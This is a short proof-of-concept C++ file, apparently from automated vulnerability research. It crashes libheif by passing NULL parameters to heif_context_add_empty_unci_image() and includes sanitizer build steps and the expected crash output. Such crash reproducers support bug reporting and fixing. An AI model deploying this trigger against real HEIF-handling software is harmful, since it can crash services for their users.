/**
 * SF13 POC: NULL pointer dereference in heif_context_add_empty_unci_image()
 *
 * Build inside Docker (vulagent/libheif:latest):
 *   mkdir /tmp/hb && cd /tmp/hb
 *   cmake /src/libheif -DBUILD_SHARED_LIBS=ON -DWITH_UNCOMPRESSED_CODEC=ON \
 *         -DCMAKE_C_COMPILER=clang -DCMAKE_CXX_COMPILER=clang++ \
 *         -DCMAKE_C_FLAGS='-fsanitize=address,undefined' \
 *         -DCMAKE_CXX_FLAGS='-fsanitize=address,undefined' \
 *         -DCMAKE_INSTALL_PREFIX=/tmp/hi
 *   make -j4 heif && make install
 *   clang++ -o poc poc_trigger.cc -I/tmp/hi/include -L/tmp/hi/lib \
 *           -lheif -Wl,-rpath,/tmp/hi/lib -fsanitize=address,undefined
 *   ASAN_OPTIONS="detect_leaks=0:abort_on_error=1:symbolize=1" ./poc
 *
 * Expected:
 *   UBSan: member access within null pointer at unc_image.cc:113
 *   ASAN: SEGV in ImageItem_uncompressed::add_unci_item
 */

#include <stdio.h>
#include <stdlib.h>
#include <libheif/heif.h>
#include <libheif/heif_uncompressed.h>

int main() {
    fprintf(stderr, "=== SF13 POC: NULL parameters in heif_context_add_empty_unci_image ===\n");

    heif_context* ctx = heif_context_alloc();
    heif_image* proto = nullptr;
    heif_image_create(64, 64, heif_colorspace_YCbCr, heif_chroma_420, &proto);
    heif_image_add_plane(proto, heif_channel_Y, 64, 64, 8);
    heif_image_add_plane(proto, heif_channel_Cb, 32, 32, 8);
    heif_image_add_plane(proto, heif_channel_Cr, 32, 32, 8);

    heif_image_handle* out = nullptr;

    // SF13: parameters is NULL but dereferenced unconditionally at unc_image.cc:113:
    //   if (parameters->image_width % parameters->tile_width != 0 || ...)
    // CRASH HERE
    heif_context_add_empty_unci_image(ctx, nullptr, nullptr, proto, &out);

    fprintf(stderr, "UNEXPECTED: no crash\n");
    heif_image_release(proto);
    heif_context_free(ctx);
    return 0;
}
